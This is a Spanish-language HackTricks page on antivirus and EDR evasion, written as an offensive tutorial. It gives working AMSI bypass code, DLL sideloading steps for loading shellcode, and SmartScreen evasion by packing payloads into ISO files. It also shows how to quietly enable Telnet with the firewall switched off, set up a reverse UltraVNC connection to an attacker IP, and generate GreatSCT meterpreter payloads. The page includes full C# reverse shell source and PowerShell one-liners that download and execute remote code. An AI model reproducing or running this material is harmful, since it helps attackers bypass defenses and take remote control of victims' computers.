# Antivirus (AV) Bypass

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_se requiere polaco fluido escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

**This page was written by** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Metodología de Evasión de AV**

Actualmente, los AV utilizan diferentes métodos para verificar si un archivo es malicioso o no, detección estática, análisis dinámico y, para los EDR más avanzados, análisis de comportamiento.

### **Detección estática**

La detección estática se logra marcando cadenas maliciosas conocidas o arreglos de bytes en un binario o script, y también extrayendo información del propio archivo (por ejemplo, descripción del archivo, nombre de la empresa, firmas digitales, icono, suma de verificación, etc.). Esto significa que usar herramientas públicas conocidas puede hacer que te atrapen más fácilmente, ya que probablemente han sido analizadas y marcadas como maliciosas. Hay un par de formas de eludir este tipo de detección:

* **Cifrado**

Si cifras el binario, no habrá forma de que el AV detecte tu programa, pero necesitarás algún tipo de cargador para descifrar y ejecutar el programa en memoria.

* **Ofuscación**

A veces, todo lo que necesitas hacer es cambiar algunas cadenas en tu binario o script para que pase el AV, pero esto puede ser una tarea que consume tiempo dependiendo de lo que estés tratando de ofuscar.

* **Herramientas personalizadas**

Si desarrollas tus propias herramientas, no habrá firmas malas conocidas, pero esto requiere mucho tiempo y esfuerzo.

{% hint style="info" %}
Una buena manera de verificar contra la detección estática de Windows Defender es [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Básicamente, divide el archivo en múltiples segmentos y luego le pide a Defender que escanee cada uno individualmente, de esta manera, puede decirte exactamente cuáles son las cadenas o bytes marcados en tu binario.
{% endhint %}

Te recomiendo encarecidamente que revises esta [lista de reproducción de YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) sobre evasión práctica de AV.

### **Análisis dinámico**

El análisis dinámico es cuando el AV ejecuta tu binario en un sandbox y observa la actividad maliciosa (por ejemplo, intentar descifrar y leer las contraseñas de tu navegador, realizar un minidump en LSASS, etc.). Esta parte puede ser un poco más complicada de manejar, pero aquí hay algunas cosas que puedes hacer para evadir los sandboxes.

* **Dormir antes de la ejecución** Dependiendo de cómo esté implementado, puede ser una gran manera de eludir el análisis dinámico del AV. Los AV tienen un tiempo muy corto para escanear archivos para no interrumpir el flujo de trabajo del usuario, por lo que usar largos períodos de espera puede perturbar el análisis de los binarios. El problema es que muchos sandboxes de AV pueden simplemente omitir el sueño dependiendo de cómo esté implementado.
* **Verificar los recursos de la máquina** Generalmente, los sandboxes tienen muy pocos recursos para trabajar (por ejemplo, < 2GB de RAM), de lo contrario, podrían ralentizar la máquina del usuario. También puedes ser muy creativo aquí, por ejemplo, verificando la temperatura de la CPU o incluso las velocidades del ventilador, no todo estará implementado en el sandbox.
* **Verificaciones específicas de la máquina** Si deseas dirigirte a un usuario cuya estación de trabajo está unida al dominio "contoso.local", puedes hacer una verificación en el dominio de la computadora para ver si coincide con el que has especificado, si no coincide, puedes hacer que tu programa salga.

Resulta que el nombre de la computadora del Sandbox de Microsoft Defender es HAL9TH, así que puedes verificar el nombre de la computadora en tu malware antes de la detonación, si el nombre coincide con HAL9TH, significa que estás dentro del sandbox de Defender, por lo que puedes hacer que tu programa salga.

<figure><img src="../.gitbook/assets/image (209).png" alt=""><figcaption><p>fuente: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algunos otros consejos realmente buenos de [@mgeeky](https://twitter.com/mariuszbit) para ir contra los Sandboxes

<figure><img src="../.gitbook/assets/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Como hemos dicho antes en este post, **las herramientas públicas** eventualmente **serán detectadas**, así que deberías preguntarte algo:

Por ejemplo, si deseas volcar LSASS, **¿realmente necesitas usar mimikatz**? ¿O podrías usar un proyecto diferente que sea menos conocido y que también volque LSASS?

La respuesta correcta es probablemente la última. Tomando a mimikatz como ejemplo, probablemente sea una de, si no la pieza de malware más marcada por los AV y EDR, mientras que el proyecto en sí es súper genial, también es una pesadilla trabajar con él para eludir los AV, así que solo busca alternativas para lo que estás tratando de lograr.

{% hint style="info" %}
Al modificar tus cargas útiles para la evasión, asegúrate de **desactivar la presentación automática de muestras** en Defender, y por favor, en serio, **NO SUBAS A VIRUSTOTAL** si tu objetivo es lograr evasión a largo plazo. Si deseas verificar si tu carga útil es detectada por un AV en particular, instálalo en una VM, intenta desactivar la presentación automática de muestras y pruébalo allí hasta que estés satisfecho con el resultado.
{% endhint %}

## EXEs vs DLLs

Siempre que sea posible, **prioriza el uso de DLLs para la evasión**, en mi experiencia, los archivos DLL son generalmente **mucho menos detectados** y analizados, por lo que es un truco muy simple de usar para evitar la detección en algunos casos (si tu carga útil tiene alguna forma de ejecutarse como una DLL, por supuesto).

Como podemos ver en esta imagen, una carga útil DLL de Havoc tiene una tasa de detección de 4/26 en antiscan.me, mientras que la carga útil EXE tiene una tasa de detección de 7/26.

<figure><img src="../.gitbook/assets/image (1130).png" alt=""><figcaption><p>comparación de antiscan.me de una carga útil EXE normal de Havoc vs una DLL normal de Havoc</p></figcaption></figure>

Ahora mostraremos algunos trucos que puedes usar con archivos DLL para ser mucho más sigiloso.

## Carga lateral de DLL y Proxying

**Carga lateral de DLL** aprovecha el orden de búsqueda de DLL utilizado por el cargador al posicionar tanto la aplicación víctima como la(s) carga útil(s) maliciosa(s) una al lado de la otra.

Puedes verificar programas susceptibles a la carga lateral de DLL usando [Siofra](https://github.com/Cybereason/siofra) y el siguiente script de powershell:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Este comando mostrará la lista de programas susceptibles a la suplantación de DLL dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.

Te recomiendo encarecidamente que **explores los programas suplantables/cargables de DLL tú mismo**, esta técnica es bastante sigilosa si se hace correctamente, pero si usas programas cargables de DLL conocidos públicamente, podrías ser atrapado fácilmente.

Simplemente colocar una DLL maliciosa con el nombre que un programa espera cargar, no cargará tu carga útil, ya que el programa espera algunas funciones específicas dentro de esa DLL. Para solucionar este problema, utilizaremos otra técnica llamada **Proxy/Redirección de DLL**.

**Proxy de DLL** reenvía las llamadas que un programa hace desde la DLL proxy (y maliciosa) a la DLL original, preservando así la funcionalidad del programa y pudiendo manejar la ejecución de tu carga útil.

Estaré utilizando el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estos son los pasos que seguí:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

El último comando nos dará 2 archivos: una plantilla de código fuente DLL y la DLL original renombrada.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Estos son los resultados:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

¡Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como el DLL proxy tienen una tasa de detección de 0/26 en [antiscan.me](https://antiscan.me)! Yo llamaría a eso un éxito.

<figure><img src="../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Te **recomiendo encarecidamente** que veas el [VOD de twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading y también el [video de ippsec](https://www.youtube.com/watch?v=3eROsG\_WNpE) para aprender más sobre lo que hemos discutido en mayor profundidad.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze es un kit de herramientas de payload para eludir EDRs utilizando procesos suspendidos, syscalls directos y métodos de ejecución alternativos`

Puedes usar Freeze para cargar y ejecutar tu shellcode de manera sigilosa.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
La evasión es solo un juego de gato y ratón, lo que funciona hoy podría ser detectado mañana, así que nunca confíes solo en una herramienta, si es posible, intenta encadenar múltiples técnicas de evasión.
{% endhint %}

## AMSI (Interfaz de Escaneo Anti-Malware)

AMSI fue creado para prevenir "[malware sin archivos](https://en.wikipedia.org/wiki/Fileless\_malware)". Inicialmente, los AV solo eran capaces de escanear **archivos en disco**, por lo que si podías ejecutar cargas útiles **directamente en memoria**, el AV no podía hacer nada para prevenirlo, ya que no tenía suficiente visibilidad.

La función AMSI está integrada en estos componentes de Windows.

* Control de Cuentas de Usuario, o UAC (elevación de EXE, COM, MSI o instalación de ActiveX)
* PowerShell (scripts, uso interactivo y evaluación de código dinámico)
* Windows Script Host (wscript.exe y cscript.exe)
* JavaScript y VBScript
* Macros de Office VBA

Permite a las soluciones antivirus inspeccionar el comportamiento de los scripts al exponer el contenido del script en una forma que es tanto sin cifrar como sin ofuscar.

Ejecutar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` producirá la siguiente alerta en Windows Defender.

<figure><img src="../.gitbook/assets/image (1135).png" alt=""><figcaption></figcaption></figure>

Nota cómo antepone `amsi:` y luego la ruta al ejecutable desde el cual se ejecutó el script, en este caso, powershell.exe

No dejamos ningún archivo en disco, pero aún así nos atraparon en memoria debido a AMSI.

Hay un par de formas de eludir AMSI:

* **Ofuscación**

Dado que AMSI principalmente trabaja con detecciones estáticas, por lo tanto, modificar los scripts que intentas cargar puede ser una buena manera de evadir la detección.

Sin embargo, AMSI tiene la capacidad de desofuscar scripts incluso si tiene múltiples capas, por lo que la ofuscación podría ser una mala opción dependiendo de cómo se haga. Esto hace que no sea tan sencillo evadir. Aunque, a veces, todo lo que necesitas hacer es cambiar un par de nombres de variables y estarás bien, así que depende de cuánto algo haya sido marcado.

* **Evasión de AMSI**

Dado que AMSI se implementa cargando una DLL en el proceso de powershell (también cscript.exe, wscript.exe, etc.), es posible manipularlo fácilmente incluso ejecutándose como un usuario sin privilegios. Debido a este defecto en la implementación de AMSI, los investigadores han encontrado múltiples formas de evadir el escaneo de AMSI.

**Forzar un Error**

Forzar que la inicialización de AMSI falle (amsiInitFailed) resultará en que no se inicie ningún escaneo para el proceso actual. Originalmente, esto fue divulgado por [Matt Graeber](https://twitter.com/mattifestation) y Microsoft ha desarrollado una firma para prevenir un uso más amplio.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Todo lo que se necesitó fue una línea de código de powershell para hacer que AMSI fuera inutilizable para el proceso de powershell actual. Esta línea, por supuesto, ha sido marcada por AMSI mismo, por lo que se necesita alguna modificación para usar esta técnica.

Aquí hay un bypass de AMSI modificado que tomé de este [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Patching de Memoria**

Esta técnica fue descubierta inicialmente por [@RastaMouse](https://twitter.com/\_RastaMouse/) y consiste en encontrar la dirección de la función "AmsiScanBuffer" en amsi.dll (responsable de escanear la entrada proporcionada por el usuario) y sobrescribirla con instrucciones para devolver el código para E\_INVALIDARG, de esta manera, el resultado del escaneo real devolverá 0, que se interpreta como un resultado limpio.

{% hint style="info" %}
Por favor, lee [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para una explicación más detallada.
{% endhint %}

También hay muchas otras técnicas utilizadas para eludir AMSI con PowerShell, consulta [**esta página**](basic-powershell-for-pentesters/#amsi-bypass) y [este repositorio](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para aprender más sobre ellas.

O este script que a través de parches de memoria parcheará cada nuevo Powersh

## Ofuscación

Hay varias herramientas que se pueden usar para **ofuscar código en texto claro de C#**, generar **plantillas de metaprogramación** para compilar binarios o **ofuscar binarios compilados** como:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Ofuscador de C#**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar un fork de código abierto de la suite de compilación [LLVM](http://www.llvm.org/) capaz de proporcionar mayor seguridad en el software a través de [ofuscación de código](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) y protección contra manipulaciones.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo usar el lenguaje `C++11/14` para generar, en tiempo de compilación, código ofuscado sin usar ninguna herramienta externa y sin modificar el compilador.
* [**obfy**](https://github.com/fritzone/obfy): Agrega una capa de operaciones ofuscadas generadas por el marco de metaprogramación de plantillas de C++ que dificultará un poco la vida a la persona que quiera crackear la aplicación.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un ofuscador de binarios x64 que puede ofuscar varios archivos pe diferentes, incluyendo: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame es un motor de código metamórfico simple para ejecutables arbitrarios.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un marco de ofuscación de código de grano fino para lenguajes compatibles con LLVM utilizando ROP (programación orientada a retorno). ROPfuscator ofusca un programa a nivel de código de ensamblaje transformando instrucciones regulares en cadenas ROP, frustrando nuestra concepción natural del flujo de control normal.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt es un Crypter PE de .NET escrito en Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor es capaz de convertir EXE/DLL existentes en shellcode y luego cargarlos

## SmartScreen & MoTW

Es posible que hayas visto esta pantalla al descargar algunos ejecutables de internet y ejecutarlos.

Microsoft Defender SmartScreen es un mecanismo de seguridad destinado a proteger al usuario final contra la ejecución de aplicaciones potencialmente maliciosas.

<figure><img src="../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente con un enfoque basado en la reputación, lo que significa que las aplicaciones descargadas poco comúnmente activarán SmartScreen, alertando y evitando que el usuario final ejecute el archivo (aunque el archivo aún se puede ejecutar haciendo clic en Más información -> Ejecutar de todos modos).

**MoTW** (Marca de la Web) es un [Flujo de Datos Alternativo NTFS](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) con el nombre de Zone.Identifier que se crea automáticamente al descargar archivos de internet, junto con la URL de la que se descargó.

<figure><img src="../.gitbook/assets/image (237).png" alt=""><figcaption><p>Comprobando el ADS Zone.Identifier para un archivo descargado de internet.</p></figcaption></figure>

{% hint style="info" %}
Es importante tener en cuenta que los ejecutables firmados con un certificado de firma **confiable** **no activarán SmartScreen**.
{% endhint %}

Una forma muy efectiva de evitar que tus cargas útiles obtengan la Marca de la Web es empaquetarlas dentro de algún tipo de contenedor como un ISO. Esto sucede porque la Marca de la Web (MOTW) **no puede** aplicarse a volúmenes **no NTFS**.

<figure><img src="../.gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) es una herramienta que empaqueta cargas útiles en contenedores de salida para evadir la Marca de la Web.

Ejemplo de uso:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aquí hay una demostración para eludir SmartScreen empaquetando cargas útiles dentro de archivos ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Reflexión de Ensamblaje C#

Cargar binarios de C# en memoria se conoce desde hace bastante tiempo y sigue siendo una excelente manera de ejecutar tus herramientas de post-explotación sin ser atrapado por AV.

Dado que la carga útil se cargará directamente en la memoria sin tocar el disco, solo tendremos que preocuparnos por parchear AMSI para todo el proceso.

La mayoría de los marcos C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya ofrecen la capacidad de ejecutar ensamblajes de C# directamente en memoria, pero hay diferentes formas de hacerlo:

* **Fork\&Run**

Implica **generar un nuevo proceso sacrificial**, inyectar tu código malicioso de post-explotación en ese nuevo proceso, ejecutar tu código malicioso y, cuando termines, matar el nuevo proceso. Esto tiene tanto sus beneficios como sus desventajas. El beneficio del método fork and run es que la ejecución ocurre **fuera** de nuestro proceso de implante Beacon. Esto significa que si algo en nuestra acción de post-explotación sale mal o es detectado, hay una **mucho mayor probabilidad** de que nuestro **implante sobreviva.** La desventaja es que tienes una **mayor probabilidad** de ser atrapado por **Detecciones Comportamentales**.

<figure><img src="../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Se trata de inyectar el código malicioso de post-explotación **en su propio proceso**. De esta manera, puedes evitar tener que crear un nuevo proceso y que sea escaneado por AV, pero la desventaja es que si algo sale mal con la ejecución de tu carga útil, hay una **mucho mayor probabilidad** de **perder tu beacon** ya que podría fallar.

<figure><img src="../.gitbook/assets/image (1136).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Si deseas leer más sobre la carga de ensamblajes de C#, consulta este artículo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) y su BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

También puedes cargar ensamblajes de C# **desde PowerShell**, consulta [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) y el video de [S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Usando Otros Lenguajes de Programación

Como se propone en [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), es posible ejecutar código malicioso utilizando otros lenguajes al dar acceso a la máquina comprometida **al entorno del intérprete instalado en el recurso compartido SMB controlado por el atacante**.

Al permitir el acceso a los binarios del intérprete y al entorno en el recurso compartido SMB, puedes **ejecutar código arbitrario en estos lenguajes dentro de la memoria** de la máquina comprometida.

El repositorio indica: Defender aún escanea los scripts, pero al utilizar Go, Java, PHP, etc., tenemos **más flexibilidad para eludir firmas estáticas**. Las pruebas con scripts de shell reverso aleatorios no ofuscados en estos lenguajes han demostrado ser exitosas.

## Evasión Avanzada

La evasión es un tema muy complicado, a veces tienes que tener en cuenta muchas fuentes diferentes de telemetría en un solo sistema, por lo que es prácticamente imposible permanecer completamente indetectado en entornos maduros.

Cada entorno al que te enfrentes tendrá sus propias fortalezas y debilidades.

Te animo a que veas esta charla de [@ATTL4S](https://twitter.com/DaniLJ94), para obtener una base sobre técnicas de evasión más avanzadas.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Esta también es otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasión en Profundidad.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Técnicas Antiguas**

### **Ver qué partes encuentra Defender como maliciosas**

Puedes usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que **eliminará partes del binario** hasta que **descubra qué parte Defender** encuentra como maliciosa y te lo dividirá.\
Otra herramienta que hace **lo mismo es** [**avred**](https://github.com/dobin/avred) con un servicio web abierto que ofrece el servicio en [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Servidor Telnet**

Hasta Windows 10, todos los Windows venían con un **servidor Telnet** que podías instalar (como administrador) haciendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Haz que **inicie** cuando se arranque el sistema y **ejecuta** ahora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambiar el puerto telnet** (sigiloso) y desactivar el firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Descárgalo de: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (quieres las descargas bin, no la instalación)

**EN EL HOST**: Ejecuta _**winvnc.exe**_ y configura el servidor:

* Habilita la opción _Deshabilitar TrayIcon_
* Establece una contraseña en _Contraseña VNC_
* Establece una contraseña en _Contraseña de Solo Vista_

Luego, mueve el binario _**winvnc.exe**_ y el archivo **nuevo** creado _**UltraVNC.ini**_ dentro de la **víctima**

#### **Conexión inversa**

El **atacante** debe **ejecutar dentro** de su **host** el binario `vncviewer.exe -listen 5900` para que esté **preparado** para capturar una **conexión VNC** inversa. Luego, dentro de la **víctima**: Inicia el daemon winvnc `winvnc.exe -run` y ejecuta `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ADVERTENCIA:** Para mantener el sigilo no debes hacer algunas cosas

* No inicies `winvnc` si ya está en ejecución o activarás un [popup](https://i.imgur.com/1SROTTl.png). verifica si está en ejecución con `tasklist | findstr winvnc`
* No inicies `winvnc` sin `UltraVNC.ini` en el mismo directorio o abrirá [la ventana de configuración](https://i.imgur.com/rfMQWcf.png)
* No ejecutes `winvnc -h` para ayuda o activarás un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Descárgalo de: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ahora **inicia el lister** con `msfconsole -r file.rc` y **ejecuta** la **carga útil xml** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**El defensor actual terminará el proceso muy rápido.**

### Compilando nuestro propio reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primer Revershell en C#

Compílalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Úsalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando el compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Descarga y ejecución automáticas:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Lista de ofuscadores de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
